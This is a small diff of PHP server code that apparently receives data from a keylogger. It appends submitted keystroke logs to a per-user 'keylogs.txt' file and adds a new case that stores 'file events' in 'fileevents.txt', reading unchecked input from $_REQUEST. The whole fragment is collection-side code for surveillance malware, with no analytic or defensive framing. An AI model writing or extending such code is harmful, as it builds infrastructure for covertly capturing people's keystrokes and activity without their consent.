@@ -56,8 +56,16 @@ CheckFolder($userfolder);
 switch($uploadtype){
     case "logs":
         /// Get sent logs.
-        $logs = $_REQUEST["logs"];
+        $logs = $_REQUEST[$uploadtype];
         $logfile = $userfolder . "/keylogs.txt";
+        $fh = fopen($logfile, 'a') or die("Can't create file");
+        fwrite($fh, "[!time: " . date("h:i:sa") . "!]");
+        fwrite($fh, $logs);
+    break;
+    case "fileevent":
+        /// Get sent logs.
+        $logs = $_REQUEST[$uploadtype];
+        $logfile = $userfolder . "/fileevents.txt";
         $fh = fopen($logfile, 'a') or die("Can't create file");
         fwrite($fh, "[!time: " . date("h:i:sa") . "!]");
         fwrite($fh, $logs);
